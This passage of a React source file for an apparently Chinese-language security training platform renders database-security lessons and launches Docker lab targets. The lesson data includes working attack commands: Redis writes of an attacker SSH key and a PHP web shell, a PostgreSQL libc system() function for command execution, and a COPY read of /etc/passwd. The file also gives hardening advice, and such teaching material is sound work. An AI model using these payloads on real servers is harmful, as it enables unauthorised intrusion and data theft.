          "过度权限:\n- 以root用户运行MySQL\n- 授予用户不必要的SUPER权限\n- FILE权限允许读写文件系统",
          "网络曝露:\n- 绑定到0.0.0.0而非localhost\n- 未使用防火墙限制访问\n- 使用默认端口3306",
          "不安全配置:\n- 禁用日志记录\n- 未加密连接\n- 未限制登录失败尝试次数"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'Redis典型漏洞利用',
        content: 'Redis是流行的开源内存数据库，通常用于缓存和消息代理。由于其强大的功能和默认不安全的配置，Redis可能成为攻击者的目标，特别是当其以高权限运行或暴露在互联网上时。',
        examples: [
          "Redis未授权访问:\n当Redis绑定到0.0.0.0且无认证时，可直接连接并执行命令:\n$ redis-cli -h target-ip\n> CONFIG GET *\n> KEYS *",
          "Redis写SSH密钥提权:\n1. 生成SSH密钥对\n2. 设置目录: CONFIG SET dir /root/.ssh/\n3. 设置文件名: CONFIG SET dbfilename authorized_keys\n4. 写入公钥: SET key \"\\n\\nssh-rsa AAAA...\\n\\n\"\n5. 保存: SAVE",
          "Redis Webshell写入:\n如果Redis以www-data权限运行:\nCONFIG SET dir /var/www/html/\nCONFIG SET dbfilename shell.php\nSET payload \"<?php system($_GET['cmd']); ?>\"\nSAVE",
          "Redis主从复制RCE(CVE-2022-0543):\n利用Lua沙箱逃逸执行任意命令"
        ],
        difficulty: 'intermediate'
      },
      {
        title: 'Redis安全配置',
        content: 'Redis安全配置对防止未授权访问和数据泄露至关重要。默认情况下，Redis的配置偏向性能而非安全性，需要进行额外的安全加固。',
        examples: [
          "认证配置:\n在redis.conf中设置requirepass强密码",
          "网络限制:\n- bind 127.0.0.1而非0.0.0.0\n- 使用防火墙限制访问\n- 配置TLS加密",
          "权限控制:\n- 以非特权用户运行Redis\n- 禁用危险命令: rename-command CONFIG \"\"\n- 使用ACL系统(Redis 6+)限制访问",
          "监控与审计:\n- 启用日志记录\n- 监控异常连接和命令\n- 定期审查配置"
        ],
        difficulty: 'beginner'
      },
      {
        title: 'PostgreSQL典型漏洞利用',
        content: 'PostgreSQL是一个强大的开源关系型数据库系统，其高级特性和扩展功能也可能引入安全风险。PostgreSQL漏洞可能导致信息泄露、权限提升或远程代码执行。',
        examples: [
          "PostgreSQL权限提升:\n利用自定义函数执行系统命令\nCREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'C' STRICT;\nSELECT system('id');",
          "PostgreSQL文件读取:\n使用COPY命令读取系统文件\nCREATE TABLE test(t text);\nCOPY test FROM '/etc/passwd';\nSELECT * FROM test;",
          "PostgreSQL UDF注入:\n利用动态库创建恶意函数执行系统命令",
          "PostgreSQL CVE漏洞:\n如CVE-2019-9193允许超级用户执行任意系统命令"
        ],
        difficulty: 'advanced'
      },
      {
        title: '其他数据库漏洞',
        content: '除了主流数据库系统外，其他数据库如MongoDB、Oracle、Microsoft SQL Server等也存在各种安全漏洞。了解这些漏洞对全面保护数据资产至关重要。',
        examples: [
          "MongoDB未授权访问:\n早期版本默认无认证，导致大量数据泄露事件",
          "MS SQL Server漏洞:\n- xp_cmdshell执行系统命令\n- 提权存储过程\n- 链接服务器攻击",
          "Oracle漏洞:\n- TNS投毒\n- PL/SQL注入\n- 默认账户弱密码",
          "SQLite漏洞:\n- CVE-2019-5018远程代码执行\n- 格式化字符串漏洞"
        ],
        difficulty: 'expert'
      },
      {
        title: '数据库安全最佳实践',
        content: '数据库安全需要多层次防护策略，包括访问控制、网络安全、加密和审计。实施全面的数据库安全计划对保护敏感数据至关重要。',
        examples: [
          "访问控制最佳实践:\n- 实施最小权限原则\n- 使用强认证\n- 定期审查权限\n- 删除默认和测试账户",
          "网络安全措施:\n- 使用防火墙限制访问\n- 分段数据库网络\n- 加密传输(TLS)\n- 使用VPN或SSH隧道",
          "配置加固:\n- 禁用不必要功能\n- 移除示例数据库\n- 更新到最新安全补丁\n- 加密敏感数据",
          "监控与审计:\n- 启用审计日志\n- 监控异常访问\n- 实施入侵检测\n- 定期安全评估"
        ],
        difficulty: 'intermediate'
      }
    ],
    protection: [
      '实施强密码策略并使用多因素认证',
      '加密敏感数据，包括传输中和静态数据',
      '限制数据库网络访问，使用防火墙和网络分段',
      '遵循最小权限原则分配用户权限',
      '及时安装安全补丁和更新',
      '定期备份数据和测试恢复流程',
      '启用审计日志并监控可疑活动',
      '实施数据库活动监控(DAM)解决方案',
      '定期进行安全评估和渗透测试',
      '制定数据库安全策略和响应计划'
    ]
  }
};

function KnowledgeDetail() {
  const { categoryId } = useParams(); // 路由参数名是categoryId，而不是id
  const [loading, setLoading] = useState(false);
  const [category, setCategory] = useState(null);
  const [activeSection, setActiveSection] = useState(null);
  const [targetEnvStatus, setTargetEnvStatus] = useState({ loading: false, error: null, url: null, status: '正在准备启动靶场环境...' });
  const [copyStatus, setCopyStatus] = useState('');

  // 处理复制地址
  const handleCopyUrl = () => {
    // 优先使用公网地址，其次使用访问地址，最后使用本地地址
    const urlToCopy = 
      (targetEnvStatus.accessUrls && targetEnvStatus.accessUrls.public) || 
      targetEnvStatus.url || 
      targetEnvStatus.localUrl || 
      (targetEnvStatus.accessUrls && targetEnvStatus.accessUrls.localhost);
    
    if (urlToCopy) {
      navigator.clipboard.writeText(urlToCopy)
        .then(() => {
          setCopyStatus('已复制');
          setTimeout(() => setCopyStatus(''), 2000);
        })
        .catch(err => {
          console.error('复制失败:', err);
          setCopyStatus('复制失败');
          setTimeout(() => setCopyStatus(''), 2000);
        });
    }
  };

  // 处理停止靶场环境
  const handleStopEnvironment = async (section) => {
    try {
      // 设置状态为停止中
      setTargetEnvStatus({ ...targetEnvStatus, loading: true, status: '正在停止靶场环境...' });
      
      // 调用API停止环境
      const result = await stopTargetEnvironment(categoryId, section.title);
      
      if (result.error) {
        setTargetEnvStatus({ 
          loading: false, 
          error: result.message, 
          url: targetEnvStatus.url,
          containerName: targetEnvStatus.containerName,
          port: targetEnvStatus.port,
          status: '停止环境失败'
        });
      } else {
        // 成功停止环境
        setTargetEnvStatus({ 
          loading: false, 
          error: null, 
          url: null,
          containerName: null,
          port: null,
          status: '靶场环境已停止'
        });
        setActiveSection(null);
      }
    } catch (error) {
      console.error('停止环境失败:', error);
      setTargetEnvStatus({ 
        ...targetEnvStatus,
        loading: false, 
        error: error.message,
        status: '停止环境出错' 
      });
    }
  };

  // 处理实验按钮点击
  const handleExperimentClick = async (section) => {
    setActiveSection(section);
    // 设置状态为加载中
    setTargetEnvStatus({ loading: true, error: null, url: null, status: '正在准备启动靶场环境...' });
    
    try {
      // 添加调试信息
      console.log('实验按钮点击 - 知识点ID:', categoryId);
      console.log('实验按钮点击 - 章节标题:', section.title);
      
      // 启动对应的靶场环境
      const result = await startTargetEnvironment(categoryId, section.title);
      
      console.log('靶场环境启动结果:', result);
      
      if (result.error) {
        // 处理错误
        setTargetEnvStatus({ loading: false, error: result.message, url: null });
      } else {
        // 成功启动环境
        setTargetEnvStatus({ 
          loading: false, 
          error: null, 
          url: result.url,
          localUrl: result.localUrl,
          ipAddress: result.ipAddress,
          containerName: result.containerName,
          port: result.port,
          status: result.status || '靶场环境已成功启动'
        });
        
        // 可以选择自动在新窗口打开环境
        if (result.url && result.status !== '使用已运行的靶场环境') {
          window.open(result.url, '_blank');
        }
      }
    } catch (error) {
      console.error('启动环境失败:', error);
      setTargetEnvStatus({ loading: false, error: error.message, url: null });
    }
  };

  // 检查每个章节是否有运行中的靶场环境
  const checkRunningEnvironments = () => {
    if (!category || !category.sections) return;
    
    // 遍历所有章节，查找运行中的环境
    for (const section of category.sections) {
      const runningInfo = getRunningTargetInfo(categoryId, section.title);
      if (runningInfo) {
        // 找到运行中的环境，设置状态
        setActiveSection(section);
        setTargetEnvStatus({
          loading: false,
          error: null,
          url: runningInfo.url,
          localUrl: runningInfo.localUrl,
          ipAddress: runningInfo.ipAddress,
          containerName: runningInfo.containerName,
          port: runningInfo.port,
          status: '靶场环境已启动'
        });
        // 只恢复第一个找到的环境状态
        break;
      }
    }
  };

  useEffect(() => {
    setLoading(true);
    
    // 模拟API请求
    setTimeout(() => {
      // 检查知识库中是否有对应categoryId的数据
      if (knowledgeData[categoryId]) {
        setCategory(knowledgeData[categoryId]);
      }
      setLoading(false);
    }, 300);
  }, [categoryId]);

  // 页面加载后检查运行中的环境
  useEffect(() => {
    if (!loading && category) {
      checkRunningEnvironments();
    }
  }, [loading, category]);

  // 如果正在加载
  if (loading) {
    return (
      <main className="max-w-7xl mx-auto px-4 py-8 relative">
        <div className="bg-[#222222] rounded-lg p-6">
          <div className="flex items-center justify-center py-10">
            <div className="animate-spin rounded-full h-10 w-10 border-t-2 border-b-2 border-primary"></div>
          </div>
        </div>
      </main>
    );
  }

  // 如果未找到分类
  if (!category) {
    return (
      <main className="max-w-7xl mx-auto px-4 py-8 relative">
        <div className="bg-[#222222] rounded-lg p-6">
          <Link to="/knowledge" className="text-primary hover:text-primary/90 mb-6 inline-flex items-center">
            <FontAwesomeIcon icon={faArrowLeft} className="mr-2" />
            返回知识库
          </Link>
          <div className="text-center py-12">
            <FontAwesomeIcon icon={faExclamationTriangle} className="text-yellow-500 text-5xl mb-4" />
            <h1 className="text-2xl font-bold mb-2">未找到该知识分类</h1>
            <p className="text-gray-400">您请求的知识分类不存在或已被移除</p>
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="max-w-7xl mx-auto px-4 py-8 relative">
      <TerminalFeature />
      <div className="bg-[#222222] rounded-lg p-6">
        <Link to="/knowledge" className="text-primary hover:text-primary/90 mb-6 inline-flex items-center">
          <FontAwesomeIcon icon={faArrowLeft} className="mr-2" />
          返回知识库
        </Link>
        
        <div className="mb-8">
          <div className="flex items-center mb-4">
            <div className="bg-primary/20 p-3 rounded-lg mr-4">
              <FontAwesomeIcon icon={category.icon} className="text-primary text-2xl" />
            </div>
            <h1 className="text-3xl font-bold">{category.title}</h1>
          </div>
          
          <p className="text-gray-300 mb-6">{category.description}</p>
          
          <div className="bg-[#2A2A2A] rounded-lg p-4 mb-8">
            <h2 className="text-xl font-semibold mb-4 flex items-center">
              <FontAwesomeIcon icon={faInfoCircle} className="text-primary mr-2" />
              防护措施
            </h2>
            <ul className="space-y-2 ml-6 list-disc text-gray-300">
              {category.protection.map((item, index) => (
                <li key={index}>{item}</li>
              ))}
            </ul>
          </div>
        </div>
        
        {/* 详细内容章节 */}
        <div className="space-y-8">
          {category.sections.map((section, index) => (
            <div key={index} className="bg-[#2A2A2A] rounded-lg p-6">
              <div className="flex justify-between items-start mb-4">
                <h2 className="text-xl font-semibold">{section.title}</h2>
                <span className={`px-3 py-1 rounded-full text-sm ${
                  section.difficulty === 'beginner' ? 'bg-green-500/20 text-green-400' :
                  section.difficulty === 'intermediate' ? 'bg-blue-500/20 text-blue-400' :
                  section.difficulty === 'advanced' ? 'bg-yellow-500/20 text-yellow-400' :
                  'bg-red-500/20 text-red-400'
                }`}>
                  {
                    section.difficulty === 'beginner' ? '入门' :
                    section.difficulty === 'intermediate' ? '中级' :
                    section.difficulty === 'advanced' ? '高级' : '专家'
                  }
                </span>
              </div>
              
              <p className="text-gray-300 mb-6">{section.content}</p>
              
              {section.examples && section.examples.length > 0 && (
                <div>
                  <h3 className="text-lg font-medium mb-3 flex items-center">
                    <FontAwesomeIcon icon={faCode} className="text-primary mr-2" />
                    示例代码
                  </h3>
                  <div className="bg-[#1E1E1E] rounded-lg p-4 mb-4">
                    <pre className="text-gray-300 overflow-x-auto">
                      {section.examples.map((example, i) => (
                        <div key={i} className="mb-2 font-mono">
                          <span className="text-gray-500 select-none mr-2">{i+1}.</span>
                          <code className="text-primary">{example}</code>
                        </div>
                      ))}
                    </pre>
                  </div>
                </div>
              )}
              
              <div className="flex justify-between items-center mt-4">
                <span className="text-gray-500 text-sm flex items-center">
                  <FontAwesomeIcon icon={faClock} className="mr-1" />
                  预计学习时间: {section.difficulty === 'beginner' ? '30分钟' : 
                               section.difficulty === 'intermediate' ? '1小时' :
                               section.difficulty === 'advanced' ? '2小时' : '3小时+'}
                </span>
                
                <div className="flex space-x-2">
                  <button className="bg-[#333333] hover:bg-[#444444] text-white px-3 py-1 rounded flex items-center text-sm transition-colors duration-200">
                    <FontAwesomeIcon icon={faBook} className="mr-1" />
                    学习
                  </button>
                  <button 
                    className="bg-primary hover:bg-primary/90 text-white px-3 py-1 rounded flex items-center text-sm transition-colors duration-200"
                    onClick={() => handleExperimentClick(section)}
                    disabled={targetEnvStatus.loading}
                  >
                    <FontAwesomeIcon icon={faPlayCircle} className="mr-1" />
                    实验
                    {targetEnvStatus.loading && activeSection?.title === section.title && (
                      <span className="ml-1 animate-spin">⋯</span>
                    )}
                  </button>
                </div>
              </div>

              {targetEnvStatus.error && activeSection?.title === section.title && (
                <div className="mt-2 p-3 bg-[#1E1E1E] rounded-lg">
                  <div className="text-red-400 text-sm flex items-start">
                    <FontAwesomeIcon icon={faExclamationTriangle} className="mr-2 mt-0.5" />
                    <div>
                      <div className="font-medium">{targetEnvStatus.error}</div>
                      {targetEnvStatus.details && (
                        <div className="text-gray-400 text-xs mt-1">{targetEnvStatus.details}</div>
                      )}
                      {targetEnvStatus.fix && (
                        <div className="text-yellow-400 text-xs mt-1">
                          <span className="font-medium">建议解决方法: </span>{targetEnvStatus.fix}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}
              
              {targetEnvStatus.loading && activeSection?.title === section.title && (
                <div className="mt-2 p-3 bg-[#1E1E1E] rounded-lg text-blue-400 text-sm">
                  <div className="flex items-center">
                    <div className="animate-spin mr-2 h-4 w-4 border-2 border-blue-400 border-t-transparent rounded-full"></div>
                    <span className="font-medium">{targetEnvStatus.status || '正在启动环境...'}</span>
                  </div>
                  <div className="mt-2 text-gray-400 text-xs">
                    <p>请稍等，靶场环境正在启动中。这可能需要一点时间：</p>
                    <ul className="ml-4 mt-1 list-disc space-y-1">
                      <li>检查Docker服务</li>
                      <li>下载或准备镜像</li>
                      <li>分配可用网络端口</li>
                      <li>启动容器并配置网络</li>
                    </ul>
                  </div>
                </div>
              )}
              
              {!targetEnvStatus.loading && !targetEnvStatus.error && targetEnvStatus.url && activeSection?.title === section.title && (
                <div className="mt-2 p-3 bg-[#1E1E1E] rounded-lg">
                  <div className="flex items-center text-green-400 text-sm mb-2">
                    <FontAwesomeIcon icon={faCheckCircle} className="mr-1" />
                    {targetEnvStatus.status || '靶场环境已成功启动'}
                  </div>
                  
                  <div className="space-y-1">
                    {targetEnvStatus.accessUrls && targetEnvStatus.accessUrls.public && (
                      <div className="text-sm flex">
                        <span className="text-gray-400 w-20">公网地址:</span>
                        <a href={targetEnvStatus.accessUrls.public} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline truncate">
                          {targetEnvStatus.accessUrls.public}
                        </a>
                      </div>
                    )}
                    {(!targetEnvStatus.accessUrls || !targetEnvStatus.accessUrls.public) && (
                      <div className="text-sm flex">
                        <span className="text-gray-400 w-20">访问地址:</span>
                        <a href={targetEnvStatus.url} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline truncate">
                          {targetEnvStatus.url}
                        </a>
                      </div>
                    )}
                    {targetEnvStatus.accessUrls && targetEnvStatus.accessUrls.localNetwork && (
                      <div className="text-sm flex">
                        <span className="text-gray-400 w-20">局域网:</span>
                        <a href={targetEnvStatus.accessUrls.localNetwork} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline truncate">
                          {targetEnvStatus.accessUrls.localNetwork}
                        </a>
                      </div>
                    )}
                    <div className="text-sm flex">
                      <span className="text-gray-400 w-20">本地地址:</span>
                      <a href={targetEnvStatus.localUrl || (targetEnvStatus.accessUrls && targetEnvStatus.accessUrls.localhost)} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline truncate">
                        {targetEnvStatus.localUrl || (targetEnvStatus.accessUrls && targetEnvStatus.accessUrls.localhost)}
                      </a>
                    </div>
                    <div className="text-sm flex">
                      <span className="text-gray-400 w-20">端口:</span>
                      <span className="text-white">{targetEnvStatus.port}</span>
                    </div>
                    <div className="text-sm flex">
                      <span className="text-gray-400 w-20">容器名称:</span>
                      <span className="text-white truncate">{targetEnvStatus.containerName}</span>
                    </div>
                  </div>
                  
                  <div className="mt-2 flex space-x-2">
                    <a href={targetEnvStatus.url || (targetEnvStatus.accessUrls && targetEnvStatus.accessUrls.public)} target="_blank" rel="noopener noreferrer" className="bg-primary hover:bg-primary/90 text-white px-3 py-1 rounded text-xs flex items-center">
                      <FontAwesomeIcon icon={faExternalLinkAlt} className="mr-1" />
                      打开环境
                    </a>
                    <button className="bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-xs flex items-center" onClick={handleCopyUrl}>
                      <FontAwesomeIcon icon={faCopy} className="mr-1" />
                      复制地址
                      {copyStatus && <span className="ml-1">{copyStatus}</span>}
                    </button>
                    <button
                      className="bg-red-700 hover:bg-red-600 text-white px-3 py-1 rounded text-xs flex items-center"
                      onClick={() => handleStopEnvironment(section)}
                    >
                      <FontAwesomeIcon icon={faPowerOff} className="mr-1" />
                      关闭环境
                    </button>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
    </main>
  );
}

export default KnowledgeDetail; 